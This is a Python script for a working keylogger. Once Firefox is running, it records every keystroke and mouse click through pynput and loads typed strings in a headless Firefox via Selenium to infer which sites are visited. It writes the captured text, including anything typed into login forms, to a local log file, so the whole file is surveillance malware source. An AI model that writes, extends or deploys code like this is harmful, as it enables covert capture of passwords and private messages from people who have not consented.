from pynput import keyboard, mouse
from pynput.keyboard import Listener as kbListener
from pynput.mouse import Listener as ratListener
import psutil
from datetime import datetime
from threading import Timer
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.chrome.options import Options  
import time

top_11_possible_webistes = ['google', 'youtube', 'facebook', 'wikipedia', 'twitter', 'reddit', 'lectortmo', 'amazon', 'instagram', 'lazada', 'shopee']

option = webdriver.FirefoxOptions()
option.add_argument('--headless')
driver = webdriver.Firefox(executable_path='/home/root-a/Documents/Python/Driver/geckodriver',options=option)

browser = False
logs = []
string = ""
site = ""
length = 0
ctr = 0
curr_site = ""
now = datetime.now()
current_time = now.strftime("%H:%M:%S")

# Append key logs every 5 mins
# def timeout():
#     global string

#     message = ""
#     logs.append(string)
#     string = ""

#     print(logs)

#     for msg in logs:
#         if msg != "":
#             message += f"{msg} "

#     txt = open('/home/root-a/Documents/Python/Anything/Keylogger/keylogs.txt', "a+")
#     txt.write(f"{message}: {current_time}")
#     txt.close()
#     return False


def on_press(key):
    global string, site, length, logs, ctr, curr_site
    try:    
        string = string + key.char
     
    except AttributeError:

        if key == keyboard.Key.tab:
            print(string)
            logs.append(string)
            string = ""
        
        # Append key logs every "Enter button pressed then break"
        elif key == keyboard.Key.enter:
            ctr +=1
            message = ""
            length = len(string)

            try:
                driver.get(f"https://{string}")
                site = driver.current_url  
                curr_site = string    
                time.sleep(2) 

            except:              
                for item in top_11_possible_webistes:
                    if string == item[0:length]:
                        curr_site = string
                        site +=f"{item}.com "  

            finally:
                logs.append(string)
                print("List:", logs)
                string = ""
                # string is appended
                for msg in logs:               
                    if msg != "" and msg != curr_site:
                        message += f"{msg} "  

            if ctr == 2:     
                print("Ctr: ", ctr)                   
                txt = open('/home/root-a/Documents/Python/Anything/Keylogger/keylogs.txt', "a+")
                full_msg = f"{current_time}: {site} - {message} \n"
                print(full_msg)
                txt.write(full_msg)
                txt.close()
                ctr = 0
                logs.clear()

def on_release(key):
    global string
    
    if key == keyboard.Key.esc:
        print(logs)
        return False

    elif key == keyboard.Key.backspace:
        string = string[:-1]
        print(string)
        
def on_click(x, y, button, pressed):
    global string

    print('{0} at {1}'.format('Pressed' if pressed else 'Released',(x, y)))
    logs.append(string)
    string = ""


while browser != True:
    browser = "firefox-bin" in (i.name() for i in psutil.process_iter())


while browser == True:

    # Append key logs every 5 mins
    # t = Timer(300, timeout)
    # t.start()
    
    listener = kbListener(on_press=on_press,on_release=on_release)
    listener2 = ratListener(on_click=on_click)


    listener.start()
    listener2.start()

    listener.join()
    listener2.join()
